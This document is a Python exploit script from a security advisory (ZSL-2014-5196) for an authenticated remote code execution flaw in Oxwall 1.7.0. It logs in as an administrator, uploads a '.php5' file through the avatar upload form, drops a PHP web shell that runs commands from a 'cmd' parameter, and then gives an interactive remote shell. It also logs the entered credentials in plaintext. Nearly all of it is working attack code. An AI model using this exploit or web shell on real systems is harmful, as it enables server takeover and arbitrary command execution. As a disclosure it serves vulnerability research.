#!/usr/bin/env python
#
#
# Oxwall 1.7.0 Remote Code Execution Exploit
#
#
# Vendor: Oxwall Software Foundation
# Product web page: http://www.oxwall.org
# Affected version: 1.7.0 (build 7907 and 7906)
#
# Summary: Oxwall is unbelievably flexible and easy to use PHP/MySQL
# social networking software platform.
#
# Desc: Oxwall suffers from an authenticated arbitrary PHP code
# execution. The vulnerability is caused due to the improper
# verification of uploaded files in '/admin/settings/user' script
# thru the 'avatar' and 'bigAvatar' POST parameters. This can be
# exploited to execute arbitrary PHP code by uploading a malicious
# PHP script file with '.php5' extension (to bypass the '.htaccess'
# block rule) that will be stored in '/ow_userfiles/plugins/base/avatars/'
# directory.
#
# Tested on: Kali Linux 3.7-trunk-686-pae
#    	     Apache/2.2.22 (Debian)
#            PHP 5.4.4-13(apache2handler)
#            MySQL 5.5.28
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#
# Zero Science Lab - http://www.zeroscience.mk
# Macedonian Information Security Research And Development Laboratory
#
#
# Advisory ID: ZSL-2014-5196
# Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2014-5196.php
#
#
# 18.07.2014
#
#

version = '3.0.0.251'

import itertools, mimetools, mimetypes
import cookielib, urllib, urllib2, sys
import logging, os, time, datetime, re

from colorama import Fore, Back, Style, init
from cStringIO import StringIO
from urllib2 import URLError

init()

if os.name == 'posix': os.system('clear')
if os.name == 'nt': os.system('cls')
piton = os.path.basename(sys.argv[0])

def bannerche():
	print '''
 @---------------------------------------------------------------@
 |                                                               |
 |          Oxwall 1.7.0 Remote Code Execution Exploit           |
 |                                                               |
 |                                                               |
 |                       ID: ZSL-2014-5196                       |
 |                                                               |
 |              Copyleft (c) 2014, Zero Science Lab              |
 |                                                               |
 @---------------------------------------------------------------@
          '''
	if len(sys.argv) < 2:
		print '\n\x20\x20[*] '+Fore.YELLOW+'Usage: '+Fore.RESET+piton+' <hostname>\n'
		print '\x20\x20[*] '+Fore.CYAN+'Example: '+Fore.RESET+piton+' zeroscience.mk\n'
		sys.exit()

bannerche()

print '\n\x20\x20[*] Initialising exploit '+'.'*34+Fore.GREEN+'[OK]'+Fore.RESET

host = sys.argv[1]

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

try:
	opener.open('http://'+host+'/sign-in?back-uri=admin')
except urllib2.HTTPError, errorzio:
	if errorzio.code == 404:
		print '\x20\x20[*] Checking path '+'.'*41+Fore.RED+'[ER]'+Fore.RESET
		print '\x20\x20[*] '+Fore.YELLOW+'Check your path entry.'+Fore.RESET
		print
		sys.exit()
except URLError, errorziocvaj:
	if errorziocvaj.reason:
		print '\x20\x20[*] Checking host '+'.'*41+Fore.RED+'[ER]'+Fore.RESET
		print '\x20\x20[*] '+Fore.YELLOW+'Check your hostname entry.'+Fore.RESET
		print
		sys.exit()

print '\x20\x20[*] Checking host and path '+'.'*32+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Login please.'

username = raw_input('\x20\x20[*] Enter username: ')
password = raw_input('\x20\x20[*] Enter password: ')

login_data = urllib.urlencode({
							'form_name' : 'sign-in',
							'identity' : username,
							'password' : password,
							'remember' : 'on',
							'submit' : 'Sign In'
							})

try:
	login = opener.open('http://'+host+'/sign-in?back-uri=admin', login_data)
	auth = login.read()
except urllib2.HTTPError, errorziotraj:
	if errorziotraj.code == 403:
		print '\x20\x20[*] '+Fore.RED+'Blocked by WAF.'+Fore.RESET
		print
		sys.exit()

for session in cj:
	sessid = session.name

print '\x20\x20[*] Mapping session ID '+'.'*36+Fore.GREEN+'[OK]'+Fore.RESET
ses_chk = re.search(r'%s=\w+' % sessid , str(cj))
cookie = ses_chk.group(0)
print '\x20\x20[*] Cookie: '+Fore.YELLOW+cookie+Fore.RESET

if re.search(r'Invalid username or email', auth):
	print '\x20\x20[*] Invalid username or email given '+'.'*23+Fore.RED+'[ER]'+Fore.RESET
	print
	sys.exit()
elif re.search(r'Invalid password', auth):
	print '\x20\x20[*] Invalid password '+'.'*38+Fore.RED+'[ER]'+Fore.RESET
	sys.exit()
else:
	print '\x20\x20[*] Authenticated '+'.'*41+Fore.GREEN+'[OK]'+Fore.RESET


class MultiPartForm(object):

    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return
    
    def get_content_type(self):
        return 'multipart/form-data; boundary=%s' % self.boundary

    def add_field(self, name, value):
        self.form_fields.append((name, value))
        return

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
        self.files.append((fieldname, filename, mimetype, body))
        return
    
    def __str__(self):

        parts = []
        part_boundary = '--' + self.boundary
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: form-data; name="%s"' % name,
              '',
              value,
            ]
            for name, value in self.form_fields
            )
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: file; name="%s"; filename="%s"' % \
                 (field_name, filename),
              'Content-Type: %s' % content_type,
              '',
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
        
        flattened = list(itertools.chain(*parts))
        flattened.append('--' + self.boundary + '--')
        flattened.append('')
        return '\r\n'.join(flattened)

if __name__ == '__main__':

    form = MultiPartForm()
    form.add_field('form_name', 'userSettingsForm')
    form.add_field('displayName', 'realname')
    form.add_field('confirmEmail', 'on')
    form.add_field('avatarSize', '90')
    form.add_field('bigAvatarSize', '190')
    form.add_field('avatar', '')
    form.add_field('join_display_photo_upload', 'display')
    form.add_field('save', 'Save')
    
    form.add_file('bigAvatar', 'thricerbd.php5', 
                  fileHandle=StringIO('<?php system(\'echo \"<?php echo \\"<pre>\\"; passthru(\$_GET[\\\'cmd\\\']); echo \\"</pre>\\"; ?>\" > liwo.php5\'); ?>'))

    request = urllib2.Request('http://'+host+'/admin/settings/user')
    request.add_header('User-agent', 'joxypoxy 3.0')
    body = str(form)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Cookie', cookie)
    request.add_header('Content-length', len(body))
    request.add_data(body)
    request.get_data()
    urllib2.urlopen(request).read()
    print '\x20\x20[*] Sending payload '+'.'*39+Fore.GREEN+'[OK]'+Fore.RESET
    checkfilename = urllib2.urlopen(request).read()
    filename = re.search('default_avatar_big_(\w+)', checkfilename).group(1)
    print '\x20\x20[*] Getting file name '+'.'*37+Fore.GREEN+'[OK]'+Fore.RESET
    print '\x20\x20[*] File name: '+Fore.YELLOW+'default_avatar_big_'+filename+'.php5'+Fore.RESET

opener.open('http://'+host+'/ow_userfiles/plugins/base/avatars/default_avatar_big_'+filename+'.php5')
print '\x20\x20[*] Persisting file liwo.php5 '+'.'*29+Fore.GREEN+'[OK]'+Fore.RESET

print '\x20\x20[*] Starting logging service '+'.'*30+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Spawning shell '+'.'*40+Fore.GREEN+'[OK]'+Fore.RESET
time.sleep(1)

furl = '/ow_userfiles/plugins/base/avatars/liwo.php5'

print
today = datetime.date.today()
fname = 'oxwall-'+today.strftime('%d-%b-%Y')+time.strftime('_%H%M%S')+'.log'
logging.basicConfig(filename=fname,level=logging.DEBUG)

logging.info(' '+'+'*75)
logging.info(' +')
logging.info(' + Log started: '+today.strftime('%A, %d-%b-%Y')+time.strftime(', %H:%M:%S'))
logging.info(' + Title: Oxwall 1.7.0 Remote Code Execution Exploit')
logging.info(' + Python program executed: '+sys.argv[0])
logging.info(' + Version: '+version)
logging.info(' + Full query: \''+piton+'\x20'+host+'\'')
logging.info(' + Username input: '+username)
logging.info(' + Password input: '+password)
logging.info(' + Vector: '+'http://'+host+furl)
logging.info(' +')
logging.info(' + Advisory ID: ZSL-2014-5196')
logging.info(' + Zero Science Lab - http://www.zeroscience.mk')
logging.info(' +')
logging.info(' '+'+'*75+'\n')

print Style.DIM+Fore.CYAN+'\x20\x20[*] Press [ ENTER ] to INSERT COIN!\n'+Style.RESET_ALL+Fore.RESET
raw_input()
while True:
	try:
		cmd = raw_input(Fore.RED+'shell@'+host+':~# '+Fore.RESET)
		execute = opener.open('http://'+host+furl+'?cmd='+urllib.quote(cmd))
		reverse = execute.read()
		pattern = re.compile(r'<pre>(.*?)</pre>',re.S|re.M)

		print Style.BRIGHT+Fore.CYAN
		cmdout = pattern.match(reverse)
		print cmdout.groups()[0].strip()
		print Style.RESET_ALL+Fore.RESET

		if cmd.strip() == 'exit':
			break

		logging.info('Command executed: '+cmd+'\n\nOutput: \n'+'='*8+'\n\n'+cmdout.groups()[0].strip()+'\n\n'+'-'*60+'\n')
	except Exception:
		break

logging.warning('\n\nLog ended: '+today.strftime('%A, %d-%b-%Y')+time.strftime(', %H:%M:%S')+'\n\nEND OF LOG')
print '\x20\x20[*] Carpe commentarius '+'.'*36+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Log file: '+Fore.YELLOW+fname+Fore.RESET
print

sys.exit()

